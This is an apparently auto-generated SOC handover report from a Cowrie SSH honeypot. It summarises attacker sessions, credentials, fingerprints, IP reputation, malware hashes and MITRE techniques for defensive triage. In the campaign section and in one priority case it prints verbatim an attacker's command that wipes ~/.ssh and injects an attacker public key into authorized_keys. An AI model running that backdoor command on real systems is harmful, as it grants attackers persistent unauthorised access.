# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-03 |
| **Generated At** | 2026-04-03T12:59:29Z |
| **Shift Time** | 12:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **38** |
| Confirmed Threats | **31** |
| False Positives Filtered | **7** (18.4%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **13** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **36** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **21** |
| Unique Credential Pairs | **18** |
| Unique Usernames | **16** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `centos` | 2 |
| `root` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |
| `1` | 1 |
| `888888` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |
| `nobody` | `1` | 1 |
| `unknown` | `888888` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `gbaznv.#` | `74.87.117.147` | 2026-04-03T12:18:00 |
| `root` | `3245gs5662d34` | `74.87.117.147` | 2026-04-03T12:18:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **38** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 13 |
| libssh | 6 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 13 | 13 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 13 | 13 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `74.87.117.147`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **27** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS10796` | Charter Communications Inc | 1 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 1 | MEDIUM |
| `AS49106` | Opticom Group AO | 1 | HIGH |
| `AS214664` | JSC Buduschee | 1 | HIGH |
| `AS10066` | LG HelloVision Corp. | 1 | HIGH |
| `AS134771` | WENZHOU, ZHEJIANG Province, P.R.China. | 1 | HIGH |
| `AS25159` | PJSC MegaFon | 1 | HIGH |
| `AS24158` | Taiwan Mobile Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3f1ae365b60a

| Field | Detail |
|---|---|
| **Source IP** | `74.87.117[.]147` |
| **First Seen** | 2026-04-03 12:17 |
| **Last Seen** | 2026-04-03 12:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 12:17:59` | `cowrie.session.connect` |
| `2026-04-03 12:17:59` | `cowrie.client.version` |
| `2026-04-03 12:17:59` | `cowrie.client.kex` |
| `2026-04-03 12:18:00` | `cowrie.login.success` |
| `2026-04-03 12:18:01` | `cowrie.session.params` |
| `2026-04-03 12:18:01` | `cowrie.command.input` |
| `2026-04-03 12:18:01` | `cowrie.command.failed` |
| `2026-04-03 12:18:01` | `cowrie.log.closed` |
| `2026-04-03 12:18:02` | `cowrie.session.params` |
| `2026-04-03 12:18:02` | `cowrie.command.input` |
| `2026-04-03 12:18:02` | `cowrie.session.file_download` |
| `2026-04-03 12:18:02` | `cowrie.log.closed` |
| `2026-04-03 12:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.87.117[.]147` to AbuseIPDB if not already reported
- [ ] Block `74.87.117[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac4a0a37598

| Field | Detail |
|---|---|
| **Source IP** | `74.87.117[.]147` |
| **First Seen** | 2026-04-03 12:18 |
| **Last Seen** | 2026-04-03 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 12:18:05` | `cowrie.session.connect` |
| `2026-04-03 12:18:05` | `cowrie.client.version` |
| `2026-04-03 12:18:05` | `cowrie.client.kex` |
| `2026-04-03 12:18:06` | `cowrie.login.success` |
| `2026-04-03 12:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.87.117[.]147` to AbuseIPDB if not already reported
- [ ] Block `74.87.117[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `16.58.56[.]214` | **5** | 2026-04-03 11:57 | 2026-04-03 11:59 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `45.91.64[.]8` | **5** | 2026-04-03 12:08 | 2026-04-03 12:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.176.134[.]241` | 1 | 2026-04-03 12:08 | 2026-04-03 12:08 | 15s | 0 | `T1592` | 🟢 LOW |
| `101.13.5[.]50` | 1 | 2026-04-03 11:51 | 2026-04-03 11:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.90.34[.]90` | 1 | 2026-04-03 11:58 | 2026-04-03 12:00 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.174.34[.]49` | 1 | 2026-04-03 10:59 | 2026-04-03 10:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.58[.]211` | 1 | 2026-04-03 11:39 | 2026-04-03 11:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.217.34[.]117` | 1 | 2026-04-03 11:19 | 2026-04-03 11:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-04-03 12:18 | 2026-04-03 12:18 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.228.228[.]86` | 1 | 2026-04-03 11:14 | 2026-04-03 11:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.130.254[.]154` | 1 | 2026-04-03 11:49 | 2026-04-03 11:49 | 12s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-03 11:59 | 2026-04-03 11:59 | 31s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]137` | 1 | 2026-04-03 12:49 | 2026-04-03 12:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.189.124[.]229` | 1 | 2026-04-03 10:53 | 2026-04-03 10:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.111[.]118` | 1 | 2026-04-03 12:39 | 2026-04-03 12:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.81.224[.]7` | 1 | 2026-04-03 12:56 | 2026-04-03 12:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.42.184[.]252` | 1 | 2026-04-03 12:58 | 2026-04-03 12:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.134.187[.]231` | 1 | 2026-04-03 12:30 | 2026-04-03 12:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.122.195[.]14` | 1 | 2026-04-03 12:37 | 2026-04-03 12:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.87.117[.]147` | 1 | 2026-04-03 12:18 | 2026-04-03 12:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.65.140[.]218` | 1 | 2026-04-03 12:11 | 2026-04-03 12:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.81.224[.]7` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 11 |
| `102.90.34[.]90` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `104.152.58[.]211` | US | VOLICO | **100** ⚠️ | 7 |
| `1.176.134[.]241` | KR | HVGaya | **100** ⚠️ | 42 |
| `62.122.195[.]14` | RU | Opticom Group AO | **100** ⚠️ | 50 |
| `103.174.34[.]49` | IN | Navkar Supertech Pvt Ltd | **100** ⚠️ | 49 |
| `31.42.184[.]252` | UA | Virtual Systems LLC | **100** ⚠️ | 14 |
| `122.228.228[.]86` | CN | Cloud computing company China Telecom Co | **100** ⚠️ | 28 |
| `196.189.124[.]229` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `178.178.194[.]137` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 25 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 20 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 15 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 38 cases |
| Tool 34  | Credential Extractor        | ✅ 21 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (18.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 21 recon entry/entries in table (2 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-03T12:59:29Z_
